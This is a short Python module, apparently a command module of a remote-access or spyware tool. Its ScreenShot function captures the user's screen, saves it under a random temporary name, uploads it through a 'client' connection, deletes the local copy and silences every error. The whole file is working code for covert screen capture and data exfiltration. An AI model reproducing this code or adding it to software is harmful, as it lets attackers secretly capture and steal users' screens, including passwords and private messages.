import os
import random
from tempfile import NamedTemporaryFile
from pyautogui import screenshot # python3 -m pip install pyautogui
from Upload import Upload_file


def ScreenShot(client, extension:str="png"):
    try:
        with NamedTemporaryFile(delete=False, dir='.', prefix=str(random.randint(1000000000, 9999999999)), suffix=".%s" % extension) as temp:
            name = temp.name
        temp.close()

        screenshot(name)
        Upload_file(client=client, filename=name)
        if os.path.exists(name):
            os.remove(name)
    except Exception:
        pass
